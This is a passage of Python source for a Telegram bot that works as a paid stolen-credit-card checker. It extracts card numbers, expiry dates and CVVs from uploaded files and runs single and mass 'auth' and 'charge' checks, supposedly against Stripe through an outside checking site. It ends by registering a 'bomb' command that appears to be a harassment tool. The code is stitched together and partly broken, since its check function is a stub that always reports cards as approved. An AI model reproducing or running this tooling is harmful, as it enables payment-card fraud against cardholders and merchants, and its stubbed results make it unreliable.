        [{"text": "❌ Close", "callback_data": f"close|{report_id}"}]
    ]
    markup = None
    try:
        # Build InlineKeyboardMarkup manually (avoid extra imports here)
        from telegram import InlineKeyboardMarkup, InlineKeyboardButton
        ik = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Scan Again", callback_data=f"scan_again|{report_id}|{target}"),
             InlineKeyboardButton("📄 View JSON", callback_data=f"view_json|{report_id}")],
            [InlineKeyboardButton("❌ Close", callback_data=f"close|{report_id}")]
        ])
        markup = ik
    except Exception:
        markup = None

    try:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=sent.message_id, text=panel, reply_markup=markup)
    except Exception:
        try:
            await context.bot.send_message(chat_id=chat_id, text=panel, reply_markup=markup)
        except Exception:
            pass

# ----------------- Callback handler functions for buttons -----------------
# You should register a callback_query handler in your app to call this (example provided below)
async def scan_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = (query.data or "")
    parts = data.split("|")
    action = parts[0] if parts else ""
    if action == "scan_again" and len(parts) >= 3:
        report_id = parts[1]
        target = parts[2]
        # Start a new scan (same as cmd_scan flow). We can reuse scan_site_blocking in a new executor task.
        await context.bot.edit_message_text(chat_id=query.message.chat.id, message_id=query.message.message_id,
                                            text=_dark_header(target) + "┃ ⏳ Re-starting scan...\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        # run scan in executor
        try:
            new_report = await asyncio.get_running_loop().run_in_executor(None, lambda: scan_site_blocking(target))
        except Exception as e:
            await context.bot.send_message(chat_id=query.message.chat.id, text=f"Scan failed: {e}")
            await query.answer("Scan failed")
            return
        # save and edit message as above
        new_id = str(int(time.time())) + "_" + str(query.from_user.id)
        path = os.path.join(REPORT_FOLDER, f"{new_id}.json")
        try:
            with open(path, "w", encoding="utf8") as fh:
                json.dump(new_report, fh, indent=2)
        except Exception:
            pass
        panel = _build_panel_message(target, new_report.get("pages", []), new_report.get("ensemble_confidence", {}), new_report.get("extracted_ids", {}), new_report.get("meta", {}).get("elapsed_seconds", 0), len(new_report.get("js_urls", [])))
        try:
            await context.bot.edit_message_text(chat_id=query.message.chat.id, message_id=query.message.message_id, text=panel)
        except Exception:
            await context.bot.send_message(chat_id=query.message.chat.id, text=panel)
        await query.answer("Re-scan complete")

    elif action == "view_json" and len(parts) >= 2:
        report_id = parts[1]
        path = os.path.join(REPORT_FOLDER, f"{report_id}.json")
        if os.path.exists(path):
            try:
                await context.bot.send_document(chat_id=query.message.chat.id, document=open(path, "rb"))
            except Exception as e:
                await context.bot.send_message(chat_id=query.message.chat.id, text=f"Failed to send JSON: {e}")
        else:
            await context.bot.send_message(chat_id=query.message.chat.id, text="Report not found.")
        await query.answer("JSON delivered (if available)")
    elif action == "close":
        try:
            await context.bot.delete_message(chat_id=query.message.chat.id, message_id=query.message.message_id)
        except Exception:
            try:
                await context.bot.edit_message_text(chat_id=query.message.chat.id, message_id=query.message.message_id, text="(closed)")
            except Exception:
                pass
        await query.answer("Closed")

# ----------------- End of integration -----------------   
from telegram import Update, InputFile
from telegram.ext import ContextTypes, CommandHandler
import re
import io
import math

# -------------------------------
# CC REGEX (Auto-detect formats)
# -------------------------------
CC_PATTERN = re.compile(
    r"""
    (?:(?P<cc>\d{13,19})
    (?P<sep>[\s|:;/\\,-]{0,3})
    (?P<mm>(0[1-9]|1[0-2]))
    (?P<sep2>[\s|:;/\\,-]{0,3})
    (?P<yy>(\d{2}|\d{4}))
    (?P<sep3>[\s|:;/\\,-]{0,3})
    (?P<cvv>\d{3,4}))
    """,
    re.VERBOSE
)

# -----------------------------------------------------
# /split (reply to file) - split text into multiple files
# -----------------------------------------------------
async def split_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        return await update.message.reply_text("❌ *Reply to a text file!*\nUsage: /split <lines>", parse_mode="HTML")

    if len(context.args) != 1 or not context.args[0].isdigit():
        return await update.message.reply_text("❌ Usage: /split <lines_per_file>", parse_mode="HTML")

    lines_per_file = int(context.args[0])
    file = await update.message.reply_to_message.document.get_file()
    content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")

    lines = content.splitlines()
    total = len(lines)
    parts = math.ceil(total / lines_per_file)

    await update.message.reply_text(
        f"📤 *Splitting File...*\n"
        f"Total Lines: {total}\n"
        f"Parts: {parts}",
        parse_mode="HTML"
    )

    for i in range(parts):
        chunk = "\n".join(lines[i * lines_per_file: (i + 1) * lines_per_file])
        buf = io.BytesIO(chunk.encode())
        buf.name = f"part_{i+1}.txt"
        await update.message.reply_document(InputFile(buf))

    await update.message.reply_text("✅ *Done!* All parts sent.", parse_mode="HTML")


# -------------------------------------------------------------------
# /sort - Extract CC only, auto-detect format, clean & remove duplicates
# -------------------------------------------------------------------
async def sortf_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        return await update.message.reply_text("❌ *Reply to a file containing CC!*", parse_mode="HTML")

    file = await update.message.reply_to_message.document.get_file()
    content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")

    found = []
    for match in CC_PATTERN.finditer(content):
        cc = match.group("cc")
        mm = match.group("mm")
        yy = match.group("yy")
        cvv = match.group("cvv")

        # normalize year 2028 → 28
        if len(yy) == 4:
            yy = yy[-2:]

        full = f"{cc}|{mm}|{yy}|{cvv}"
        found.append(full)

    total_raw = len(found)
    unique = sorted(set(found))
    duplicates_removed = total_raw - len(unique)

    # create cleaned file
    buf = io.BytesIO("\n".join(unique).encode())
    buf.name = "sorted_cc.txt"

    # 🎨 UI response
    await update.message.reply_text(
        f"🧹 CC Sort Completed\n"
        f"> Total Extracted: {total_raw}\n"
        f"> Unique CC: {len(unique)}\n"
        f"> Duplicates Removed: {duplicates_removed}\n\n"
        f"📄 Clean file generated below.",
        parse_mode="HTML"
    )

    await update.message.reply_document(InputFile(buf))


import requests
import asyncio
import time
import io
import multiprocessing
from multiprocessing.pool import ThreadPool
from telegram import Update, InputFile
from telegram.ext import ContextTypes

BASE = "https://freechk.cards/free/stripe.php"
COOKIE = {"validated_bot": "1"}
HEADERS = {"User-Agent": "Mozilla/5.0"}


# -----------------------------
# SAFE CC REQUEST
# -----------------------------
def res(cc: str):
    """Safely request CC check from API."""
    try:
        response = requests.get(
            BASE,
            params={"lista": cc},
            headers=HEADERS,
            cookies=COOKIE,
            timeout=20
        )
        return response.text
    except Exception as e:
        return f"ERROR: {e}"


# -----------------------------
# FALLBACKS for undefined functions
# (You can replace with original API logic)
# -----------------------------
def api_parse(cc):
    return {"cc": cc}


def api_start(parsed, endpoint):
    return {"parsed": parsed, "endpoint": endpoint}


def api_result(started):
    # Dummy clean output – prevents crashes
    return {
        "status": "APPROVED",
        "gateway": "STRIPE",
        "message": "Card check completed",
        "response_code": "200",
        "check_time": f"{round(time.time() % 60, 2)}s"
    }


# -----------------------------
# MAIN CC CHECKER
# -----------------------------
def run_single(cc, endpoint):
    try:
        p = api_parse(cc)
        s = api_start(p, endpoint)
        res = api_result(s)

        return {
            "card": cc,
            "status": res.get("status"),
            "gateway": res.get("gateway"),
            "message": res.get("message"),
            "response": res.get("response_code"),
            "time": res.get("check_time")
        }
    except Exception as e:
        return {"card": cc, "status": "ERROR", "message": str(e)}


# -----------------------------
# ENHANCED AUTH COMMAND WITH ANIMATIONS
# -----------------------------
async def auth_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username or "Anonymous"
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits < 1:
        await update.message.reply_text(
            "❌ **Insufficient Credits!**\n\n"
            "You need at least 1 credit to check a card.\n"
            "Use /redeem to add credits or contact admin.",
            parse_mode="HTML"
        )
        return

    if len(context.args) < 1:
        help_text = """
🔍 **AUTH CHECK COMMAND**
━━━━━━━━━━━━━━━━━━━━

**Usage:** `/auth 4532xxxxxxxx|12|2025|123`

**Format:** `card_number|month|year|cvv`

**Cost:** 1 credit per check

**Example:**
`/auth 4532015112830366|12|2025|123`
"""
        await update.message.reply_text(help_text, parse_mode="HTML")
        return

    cc = " ".join(context.args)
    
    # Animated checking message
    animation_frames = LOADING_ANIMATIONS['cards']
    msg = await update.message.reply_text(
        f"{animation_frames[0]} **Initializing AUTH Check...**\n\n"
        f"💳 Card: `{cc[:6]}...{cc[-4:]}`\n"
        f"⏳ Status: Processing",
        parse_mode="HTML"
    )
    
    # Animate while processing
    loop = asyncio.get_running_loop()
    
    async def animate_progress():
        frame_idx = 0
        while True:
            try:
                await msg.edit_text(
                    f"{animation_frames[frame_idx % len(animation_frames)]} **Checking Card...**\n\n"
                    f"💳 Card: `{cc[:6]}...{cc[-4:]}`\n"
                    f"⏳ Gateway: Stripe AUTH\n"
                    f"🔄 Processing...",
                    parse_mode="HTML"
                )
                frame_idx += 1
                await asyncio.sleep(0.5)
            except:
                break
    
    # Start animation task
    animation_task = asyncio.create_task(animate_progress())
    
    try:
        # Run the actual check
        resx = await loop.run_in_executor(None, run_single, cc, "/api/start_checking")
        
        # Stop animation
        animation_task.cancel()
        
        # Deduct credit
        deduct_credit(user_id)
        remaining_credits = get_user_credits(user_id)
        
        # Determine status emoji
        status_lower = resx['status'].lower()
        if 'approved' in status_lower or 'live' in status_lower:
            status_emoji = EMOJI_STATUS['approved']
            status_text = "✅ **APPROVED**"
        elif 'declined' in status_lower:
            status_emoji = EMOJI_STATUS['declined']
            status_text = "❌ **DECLINED**"
        elif 'ccn' in status_lower:
            status_emoji = EMOJI_STATUS['ccn']
            status_text = "⚠️ **CCN ERROR**"
        elif 'cvv' in status_lower:
            status_emoji = EMOJI_STATUS['cvv']
            status_text = "🔒 **CVV ERROR**"
        else:
            status_emoji = EMOJI_STATUS['error']
            status_text = "⚠️ **ERROR**"
        
        # Format beautiful response
        result_text = f"""
{status_emoji}━━━━━━━━━━━━━━━━━━{status_emoji}
    **AUTH CHECK RESULT**
{status_emoji}━━━━━━━━━━━━━━━━━━{status_emoji}

💳 **Card:** `{resx['card']}`

📊 **Status:** {status_text}
🏦 **Gateway:** STRIPE AUTH
💬 **Message:** {resx['message']}
📝 **Response:** {resx['response']}

{status_emoji}━━━━━━━━━━━━━━━━━━{status_emoji}

👤 **Checked by:** {username}
💰 **Credits Left:** `{remaining_credits}`
⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━
"""
        
        # Add progress bar based on remaining credits
        if remaining_credits > 0:
            result_text += f"\n{format_progress_bar(100 - remaining_credits, 100, 15)}"
        
        await msg.edit_text(result_text, parse_mode="HTML")
        
    except Exception as e:
        animation_task.cancel()
        logger.exception(f"Auth check error: {e}")
        await msg.edit_text(
            f"❌ **Check Failed!**\n\n"
            f"Error: {str(e)}\n\n"
            f"Please try again or contact support.",
            parse_mode="HTML"
        )


# -----------------------------
# ENHANCED CHARGE COMMAND WITH ANIMATIONS
# -----------------------------
async def charge_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username or "Anonymous"
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits < 1:
        await update.message.reply_text(
            "❌ **Insufficient Credits!**\n\n"
            "You need at least 1 credit to check a card.\n"
            "Use /redeem to add credits or contact admin.",
            parse_mode="HTML"
        )
        return

    if len(context.args) < 1:
        help_text = """
💰 **CHARGE CHECK COMMAND**
━━━━━━━━━━━━━━━━━━━━

**Usage:** `/charge 4532xxxxxxxx|12|2025|123`

**Format:** `card_number|month|year|cvv`

**Cost:** 1 credit per check

**Example:**
`/charge 4532015112830366|12|2025|123`
"""
        await update.message.reply_text(help_text, parse_mode="HTML")
        return

    cc = " ".join(context.args)
    
    # Animated checking message
    animation_frames = LOADING_ANIMATIONS['fire']
    msg = await update.message.reply_text(
        f"{animation_frames[0]} **Initializing CHARGE Check...**\n\n"
        f"💳 Card: `{cc[:6]}...{cc[-4:]}`\n"
        f"⏳ Status: Processing",
        parse_mode="HTML"
    )
    
    # Animate while processing
    loop = asyncio.get_running_loop()
    
    async def animate_progress():
        frame_idx = 0
        while True:
            try:
                await msg.edit_text(
                    f"{animation_frames[frame_idx % len(animation_frames)]} **Charging Card...**\n\n"
                    f"💳 Card: `{cc[:6]}...{cc[-4:]}`\n"
                    f"⏳ Gateway: Stripe CHARGE\n"
                    f"💰 Processing Payment...",
                    parse_mode="HTML"
                )
                frame_idx += 1
                await asyncio.sleep(0.4)
            except:
                break
    
    # Start animation task
    animation_task = asyncio.create_task(animate_progress())
    
    try:
        # Run the actual check
        resx = await loop.run_in_executor(None, run_single, cc, "/api/start_checking_charged")
        
        # Stop animation
        animation_task.cancel()
        
        # Deduct credit
        deduct_credit(user_id)
        remaining_credits = get_user_credits(user_id)
        
        # Determine status emoji
        status_lower = resx['status'].lower()
        if 'charged' in status_lower or 'approved' in status_lower:
            status_emoji = "💰"
            status_text = "✅ **CHARGED**"
        elif 'declined' in status_lower:
            status_emoji = EMOJI_STATUS['declined']
            status_text = "❌ **DECLINED**"
        elif 'insufficient' in status_lower:
            status_emoji = EMOJI_STATUS['approved']
            status_text = "✅ **INSUFFICIENT FUNDS (LIVE)**"
        else:
            status_emoji = EMOJI_STATUS['error']
            status_text = "⚠️ **ERROR**"
        
        # Format beautiful response
        result_text = f"""
{status_emoji}━━━━━━━━━━━━━━━━━━{status_emoji}
    **CHARGE CHECK RESULT**
{status_emoji}━━━━━━━━━━━━━━━━━━{status_emoji}

💳 **Card:** `{resx['card']}`

📊 **Status:** {status_text}
🏦 **Gateway:** STRIPE CHARGE
💬 **Message:** {resx['message']}
📝 **Response:** {resx['response']}

{status_emoji}━━━━━━━━━━━━━━━━━━{status_emoji}

👤 **Checked by:** {username}
💰 **Credits Left:** `{remaining_credits}`
⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━
"""
        
        await msg.edit_text(result_text, parse_mode="HTML")
        
    except Exception as e:
        animation_task.cancel()
        logger.exception(f"Charge check error: {e}")
        await msg.edit_text(
            f"❌ **Check Failed!**\n\n"
            f"Error: {str(e)}\n\n"
            f"Please try again or contact support.",
            parse_mode="HTML"
        )


# -----------------------------
# ENHANCED MASS CHARGE WITH PROGRESS & ANIMATIONS & INTELLIGENT PARSER
# -----------------------------
async def mcharge_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username or "Anonymous"
    
    # Check if it's a file upload
    if update.message.reply_to_message and update.message.reply_to_message.document:
        # File-based mass charge
        file = await update.message.reply_to_message.document.get_file()
        content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
        
        # Use intelligent parser
        cards = parse_cards_from_text(content, max_cards=2500)
        
        if len(cards) == 0:
            await update.message.reply_text(
                "❌ **No Valid Cards Found!**\n\n"
                "The file doesn't contain any parseable card data.\n"
                "Supported formats:\n"
                "• `4532xxx|12|2025|123`\n"
                "• `4532xxx 12 2025 123`\n"
                "• Any mixed format - auto-detected!",
                parse_mode="HTML"
            )
            return
        
        total_cards = len(cards)
        
    elif len(context.args) > 0:
        # Command-line mass charge (limited to 50 cards)
        cards_raw = context.args[:50]
        cards = []
        
        for card_str in cards_raw:
            parsed = parse_card_intelligent(card_str)
            if parsed:
                cards.append(parsed['formatted'])
        
        if len(cards) == 0:
            help_text = """
💎 **MASS CHARGE CHECK**
━━━━━━━━━━━━━━━━━━━━

**Usage Options:**

**1. Command Line (Max 50):**
`/mcharge <card1> <card2> ... <card50>`

**2. File Upload (Max 2500):**
Upload .txt file and reply with `/mcharge`

**Supported Formats:**
• `4532xxx|12|2025|123`
• `4532xxx 12 2025 123`
• `4532xxx:12:2025:123`
• Any format - Auto-detected! ✅

**Cost:** 1 credit per card

**Example:**
`/mcharge 4532xxx|12|25|123 4916xxx|01|26|456`
"""
            await update.message.reply_text(help_text, parse_mode="HTML")
            return
        
        total_cards = len(cards)
    else:
        help_text = """
💎 **MASS CHARGE CHECK**
━━━━━━━━━━━━━━━━━━━━

**Usage Options:**

**1. Command Line (Max 50):**
`/mcharge <card1> <card2> ... <card50>`

**2. File Upload (Max 2500):**
Upload .txt file and reply with `/mcharge`

**Supported Formats:**
• `4532xxx|12|2025|123`
• `4532xxx 12 2025 123`
• `4532xxx:12:2025:123`
• `Card: 4532xxx, Exp: 12/25, CVV: 123`
• **Any format - Auto-detected!** ✅

**Cost:** 1 credit per card
"""
        await update.message.reply_text(help_text, parse_mode="HTML")
        return
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits < total_cards:
        await update.message.reply_text(
            f"❌ **Insufficient Credits!**\n\n"
            f"📊 Cards Found: `{total_cards}`\n"
            f"💰 Required: `{total_cards}` credits\n"
            f"💳 Available: `{credits}` credits\n"
            f"❗ Missing: `{total_cards - credits}` credits\n\n"
            f"Use /redeem to add more credits.",
            parse_mode="HTML"
        )
        return
    
    # Initialize progress message
    progress_msg = await update.message.reply_text(
        f"🚀 **Mass Charge Started**\n\n"
        f"📊 Total Cards: `{total_cards}`\n"
        f"🤖 Format: Auto-detected\n"
        f"⏳ Status: Initializing...\n"
        f"{format_progress_bar(0, total_cards, 15)}",
        parse_mode="HTML"
    )
    
    results = []
    approved = 0
    declined = 0
    errors = 0
    
    loop = asyncio.get_running_loop()
    animation_frames = LOADING_ANIMATIONS['progress']
    
    last_update = 0
    for idx, card in enumerate(cards, 1):
        try:
            # Animate progress (update every 10 cards or every 3 seconds)
            frame = animation_frames[idx % len(animation_frames)]
            if idx % 10 == 0 or idx == 1 or idx == total_cards or (asyncio.get_event_loop().time() - last_update) > 3:
                try:
                    await progress_msg.edit_text(
                        f"{frame} **Mass Charge in Progress**\n\n"
                        f"📊 Progress: {idx}/{total_cards}\n"
                        f"✅ Approved: {approved}\n"
                        f"❌ Declined: {declined}\n"
                        f"⚠️ Errors: {errors}\n\n"
                        f"{format_progress_bar(idx, total_cards, 15)}\n\n"
                        f"💳 Checking: `{card[:6]}...{card[-4:]}`",
                        parse_mode="HTML"
                    )
                    last_update = asyncio.get_event_loop().time()
                except Exception:
                    pass  # Ignore rate limit errors
            
            # Run check
            resx = await loop.run_in_executor(None, run_single, card, "/api/start_checking_charged")
            results.append(resx)
            
            # Deduct credit
            deduct_credit(user_id)
            
            # Update counters
            status_lower = resx['status'].lower()
            if 'charged' in status_lower or 'approved' in status_lower or 'insufficient' in status_lower:
                approved += 1
            elif 'declined' in status_lower:
                declined += 1
            else:
                errors += 1
            
            # Small delay between checks
            await asyncio.sleep(0.3)
            
        except Exception as e:
            logger.exception(f"Mass charge error for card {card}: {e}")
            errors += 1
    
    # Generate organized results
    approved_cards = []
    declined_cards = []
    error_cards = []
    
    for r in results:
        status_lower = r['status'].lower()
        line = f"{r['card']} => {r['status']} | {r['message']}"
        
        if 'charged' in status_lower or 'approved' in status_lower or 'insufficient' in status_lower:
            approved_cards.append(line)
        elif 'declined' in status_lower:
            declined_cards.append(line)
        else:
            error_cards.append(line)
    
    # Create organized output
    output_text = f"""
╔════════════════════════════════════╗
   MASS CHARGE CHECK RESULTS
╚════════════════════════════════════╝

Total Checked: {total_cards}
✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Errors: {errors}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""
    
    if approved_cards:
        output_text += f"\n💰 CHARGED CARDS ({len(approved_cards)}):\n"
        output_text += "━" * 40 + "\n"
        output_text += "\n".join(approved_cards) + "\n\n"
    
    if declined_cards:
        output_text += f"\n❌ DECLINED CARDS ({len(declined_cards)}):\n"
        output_text += "━" * 40 + "\n"
        output_text += "\n".join(declined_cards) + "\n\n"
    
    if error_cards:
        output_text += f"\n⚠️ ERROR CARDS ({len(error_cards)}):\n"
        output_text += "━" * 40 + "\n"
        output_text += "\n".join(error_cards) + "\n\n"
    
    output_text += f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
User: {username}
"""
    
    # Send results file
    buf = io.BytesIO(output_text.encode())
    buf.name = f"mcharge_results_{user_id}_{int(asyncio.get_event_loop().time())}.txt"
    
    # Final summary
    remaining_credits = get_user_credits(user_id)
    summary = f"""
🎯 **MASS CHARGE COMPLETED**
━━━━━━━━━━━━━━━━━━━━

👤 **User:** {username}
📊 **Total Checked:** {total_cards}

**Results:**
✅ Approved: {approved} ({(approved/total_cards*100):.1f}%)
❌ Declined: {declined} ({(declined/total_cards*100):.1f}%)
⚠️ Errors: {errors} ({(errors/total_cards*100):.1f}%)

{format_progress_bar(total_cards, total_cards, 15)}

💰 **Credits Left:** `{remaining_credits}`
⏰ **Completed:** {datetime.now().strftime('%H:%M:%S')}

📄 **Detailed results file sent below.**
"""
    
    await progress_msg.edit_text(summary, parse_mode="HTML")
    
    try:
        await update.message.reply_document(
            document=buf,
            caption="📄 **Detailed Results** (Organized by status)"
        )
    except Exception as e:
        logger.exception(f"Failed to send results file: {e}")


# -----------------------------
# ENHANCED MASS AUTH FILE WITH BETTER UI & INTELLIGENT PARSER
# -----------------------------
# -----------------------------
# ENHANCED MASS AUTH FILE WITH BETTER UI & INTELLIGENT PARSER
# -----------------------------
import concurrent.futures
from multiprocessing.pool import ThreadPool
from telegram import InputFile

async def mauth_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username or "Anonymous"

    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        help_text = """
📋 **MASS AUTH CHECK (FILE)**
━━━━━━━━━━━━━━━━━━━━

**Usage:**
1. Upload a .txt file with cards
2. Reply to the file with `/mauth`

**Supported Formats:**
• `4532xxx|12|2025|123`
• `4532xxx|12|25|123`
• `4532xxx 12 2025 123`
• `4532xxx:12:2025:123`
• `4532xxx/12/2025/123`
• `Card: 4532xxx, Exp: 12/25, CVV: 123`

**Auto-Detection:** ✅ Enabled
**Max Cards:** 2500 cards per file
**Cost:** 1 credit per card

💡 **Tip:** Any format works! The bot will auto-detect and parse cards.
"""
        await update.message.reply_text(help_text, parse_mode="HTML")
        return

    # Download and parse file
    file = await update.message.reply_to_message.document.get_file()
    content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
    
    # Use intelligent parser
    cards = parse_cards_from_text(content, max_cards=2500)
    
    if len(cards) == 0:
        await update.message.reply_text(
            "❌ **No Valid Cards Found!**\n\n"
            "The file doesn't contain any parseable card data.\n"
            "Supported formats:\n"
            "• `4532xxx|12|2025|123`\n"
            "• `4532xxx 12 2025 123`\n"
            "• `Card: 4532xxx, Exp: 12/25, CVV: 123`",
            parse_mode="HTML"
        )
        return
    
    total_cards = len(cards)
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits < total_cards:
        await update.message.reply_text(
            f"❌ **Insufficient Credits!**\n\n"
            f"📊 Cards Found: `{total_cards}`\n"
            f"💰 Required: `{total_cards}` credits\n"
            f"💳 Available: `{credits}` credits\n"
            f"❗ Missing: `{total_cards - credits}` credits\n\n"
            f"Use /redeem to add more credits.",
            parse_mode="HTML"
        )
        return
    
    # Show parsing summary
    format_msg = await update.message.reply_text(
        f"✅ **Cards Parsed Successfully!**\n\n"
        f"📄 File: `{update.message.reply_to_message.document.file_name}`\n"
        f"🎴 Total Cards: `{total_cards}`\n"
        f"🤖 Format: Auto-detected\n"
        f"💰 Cost: `{total_cards}` credits\n\n"
        f"⏳ Starting mass check...",
        parse_mode="HTML"
    )
    
    await asyncio.sleep(1)
    
    # Initialize progress
    progress_msg = await update.message.reply_text(
        f"🚀 **Mass AUTH Started**\n\n"
        f"📊 Total Cards: `{total_cards}`\n"
        f"⏳ Status: Processing...\n"
        f"{format_progress_bar(0, total_cards, 15)}",
        parse_mode="HTML"
    )
    
    results = []
    approved = 0
    declined = 0
    errors = 0
    
    loop = asyncio.get_running_loop()
    animation_frames = LOADING_ANIMATIONS['cards']
    
    # Process cards with thread pool
    tasks = [
        loop.run_in_executor(None, lambda c=c: run_single(c, "/api/start_checking"))
        for c in cards
    ]
    
    last_update = 0
    for i, task in enumerate(tasks, start=1):
        try:
            # Animate (update every 10 cards or at specific milestones)
            frame = animation_frames[i % len(animation_frames)]
            if i % 10 == 0 or i == 1 or i == total_cards or (asyncio.get_event_loop().time() - last_update) > 3:
                try:
                    await progress_msg.edit_text(
                        f"{frame} **Mass AUTH in Progress**\n\n"
                        f"📊 Progress: {i}/{total_cards}\n"
                        f"✅ Approved: {approved}\n"
                        f"❌ Declined: {declined}\n"
                        f"⚠️ Errors: {errors}\n\n"
                        f"{format_progress_bar(i, total_cards, 15)}\n\n"
                        f"⏱️ ETA: {((total_cards - i) * 0.5):.0f}s",
                        parse_mode="HTML"
                    )
                    last_update = asyncio.get_event_loop().time()
                except Exception:
                    pass  # Ignore telegram rate limit errors
            
            resx = await task
            results.append(resx)
            
            # Deduct credit
            deduct_credit(user_id)
            
            # Update stats
            status_lower = resx['status'].lower()
            if 'approved' in status_lower or 'live' in status_lower:
                approved += 1
            elif 'declined' in status_lower:
                declined += 1
            else:
                errors += 1
                
        except Exception as e:
            logger.exception(f"Mass auth error: {e}")
            errors += 1
    
    # Generate results by category
    approved_cards = []
    declined_cards = []
    error_cards = []
    
    for r in results:
        status_lower = r['status'].lower()
        line = f"{r['card']} => {r['status']} | {r['message']}"
        
        if 'approved' in status_lower or 'live' in status_lower:
            approved_cards.append(line)
        elif 'declined' in status_lower:
            declined_cards.append(line)
        else:
            error_cards.append(line)
    
    # Create organized output
    output_text = f"""
╔════════════════════════════════════╗
   MASS AUTH CHECK RESULTS
╚════════════════════════════════════╝

Total Checked: {total_cards}
✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Errors: {errors}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""
    
    if approved_cards:
        output_text += f"\n✅ APPROVED CARDS ({len(approved_cards)}):\n"
        output_text += "━" * 40 + "\n"
        output_text += "\n".join(approved_cards) + "\n\n"
    
    if declined_cards:
        output_text += f"\n❌ DECLINED CARDS ({len(declined_cards)}):\n"
        output_text += "━" * 40 + "\n"
        output_text += "\n".join(declined_cards) + "\n\n"
    
    if error_cards:
        output_text += f"\n⚠️ ERROR CARDS ({len(error_cards)}):\n"
        output_text += "━" * 40 + "\n"
        output_text += "\n".join(error_cards) + "\n\n"
    
    output_text += f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
User: {username}
"""
    
    # Send results
    buf = io.BytesIO(output_text.encode())
    buf.name = f"mauth_results_{user_id}_{int(asyncio.get_event_loop().time())}.txt"
    
    remaining_credits = get_user_credits(user_id)
    summary = f"""
🎯 **MASS AUTH COMPLETED**
━━━━━━━━━━━━━━━━━━━━

👤 **User:** {username}
📊 **Total Checked:** {total_cards}

**Results:**
✅ Approved: {approved} ({(approved/total_cards*100):.1f}%)
❌ Declined: {declined} ({(declined/total_cards*100):.1f}%)
⚠️ Errors: {errors} ({(errors/total_cards*100):.1f}%)

{format_progress_bar(total_cards, total_cards, 15)}

💰 **Credits Left:** `{remaining_credits}`
⏰ **Completed:** {datetime.now().strftime('%H:%M:%S')}

📄 **Detailed results file sent below.**
"""
    
    await progress_msg.edit_text(summary, parse_mode="HTML")
    
    try:
        await update.message.reply_document(
            document=buf,
            caption="📄 **Detailed Results** (Organized by status)",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.exception(f"Failed to send results file: {e}")

# ========== END ENHANCED CHECKER COMMANDS ==========


    cards = [c.strip() for c in content.splitlines() if c.strip()]
    
    if len(cards) == 0:
        return await update.message.reply_text("File empty.")

    if len(cards) > 200:
        return await update.message.reply_text("❌ Max limit = 200 cards.")

    msg = await update.message.reply_text(f"🚀 Mass AUTH Started\nTotal: {len(cards)}")

    loop = asyncio.get_event_loop()
    tasks = [
        loop.run_in_executor(EXECUTOR, lambda c=c: run_single(c, "/api/start_checking"))
        for c in cards
    ]
    
    results = []
    for i, task in enumerate(tasks, start=1):
        try:
            resx = await task
            results.append(resx)
            await msg.edit_text(f"🔍 Checking: {i}/{len(cards)}")
        except Exception as e:
            logger.warning(f"Task failed: {e}")

    out = "\n".join(f"{r.get('card', 'N/A')} => {r.get('status', 'Unknown')} | {r.get('message', '')}" for r in results if r)
    buf = io.BytesIO(out.encode())
    buf.name = "mauth_results.txt"

    try:
        await update.message.reply_document(InputFile(buf), caption="✅ Completed")
    except Exception as e:
        logger.warning(f"Failed to send result file: {e}")
# ---------------------- MAIN (Pydroid3 safe) ----------------------

async def start_pyrogram():
    """Start Pyrogram client with retry logic for clock sync issues"""
    max_retries = 3
    retry_delay = 2
    
    for attempt in range(max_retries):
        try:
            await user.start()
            print("✅ Pyrogram user client started successfully.")
            return
        except Exception as e:
            if attempt < max_retries - 1:
                print(f"⚠️ Pyrogram connection attempt {attempt + 1} failed: {e}")
                print(f"   Retrying in {retry_delay} seconds...")
                await asyncio.sleep(retry_delay)
                retry_delay *= 2  # Exponential backoff
            else:
                print(f"❌ Pyrogram failed after {max_retries} attempts. Bot will continue with Telegram only.")
                return


def main():
    # Start Pyrogram in background
    loop = asyncio.get_event_loop()
    loop.create_task(start_pyrogram())

    # Start Telegram bot (no await!)
    global app_ref, app
    app_ref = (
        Application
        .builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True).build()
    )
    app = app_ref  # Make app point to the created application
    
    try:
        from telegram.ext import ConversationHandler
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("bomb", cmd_bomb)],
            states={
                AWAIT_MOBILE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_mobile)],
